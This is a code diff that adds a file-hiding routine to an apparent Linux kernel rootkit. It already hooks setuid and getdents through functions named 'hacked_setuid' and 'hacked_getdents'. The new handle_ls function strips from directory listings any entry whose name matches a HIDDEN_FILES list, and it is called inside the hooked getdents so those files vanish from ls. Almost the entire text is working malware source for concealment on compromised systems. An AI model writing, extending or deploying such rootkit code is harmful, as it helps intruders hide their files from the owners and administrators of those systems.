@@ -33,6 +33,67 @@ asmlinkage long hacked_setuid(uid_t uid)
     return ret;
 }
 
+// Will hide any files from within the dirp and return the new length of dirp
+long handle_ls(struct linux_dirent *dirp, long length)
+{
+    
+    unsigned int offset = 0;
+    struct linux_dirent *cur_dirent;
+    int i;
+    struct dirent *new_dirp = NULL;
+    int new_length = 0;
+    bool isHidden = false;
+
+    //struct dirent *moving_dirp = NULL;
+
+    DEBUG("Entering LS filter");
+    // Create a new output buffer for the return of getdents
+    new_dirp = (struct dirent *) kmalloc(length, GFP_KERNEL);
+    if(!new_dirp)
+    {
+        DEBUG("RAN OUT OF MEMORY in LS Filter");
+        goto error;
+    }
+
+    // length is the length of memory (in bytes) pointed to by dirp
+    while (offset < length)
+    {
+        char *dirent_ptr = (char *)(dirp);
+        dirent_ptr += offset;
+        cur_dirent = (struct linux_dirent *)dirent_ptr;
+
+        isHidden = false;
+        for(i=0; i<sizeof(HIDDEN_FILES)/sizeof(char *); i++)
+        {
+            // Hidden file is found
+            if(strstr(cur_dirent->d_name, HIDDEN_FILES[i]) != NULL)
+            {
+                printk("HIDDEN FILE: %s\n", cur_dirent->d_name);
+                isHidden = true;
+                break;
+            }
+        }
+        
+        if (!isHidden)
+        {
+            memcpy((void *) new_dirp+new_length, cur_dirent, cur_dirent->d_reclen);
+            new_length += cur_dirent->d_reclen;
+        }
+        offset += cur_dirent->d_reclen;
+    }
+    DEBUG("Exiting LS filter");
+
+    memcpy(dirp, new_dirp, new_length);
+    length = new_length;
+
+cleanup:
+    if(new_dirp)
+        kfree(new_dirp);
+    return length;
+error:
+    goto cleanup;
+}
+
 asmlinkage long hacked_getdents(unsigned int fd,
 				struct linux_dirent *dirp,
 				unsigned int count)
@@ -53,6 +114,10 @@ asmlinkage long hacked_getdents(unsigned int fd,
     DEBUG("Entering hacked getdents");
     // Call original getdents system call.
     getdents_ret = (*orig_getdents)(fd, dirp, count);
+
+    // Entry point into hiding files function
+    getdents_ret = handle_ls(dirp, getdents_ret);
+
     spin_lock(&open_files->file_lock);
     fd_file = fcheck(fd);
     if (unlikely(!fd_file)) {
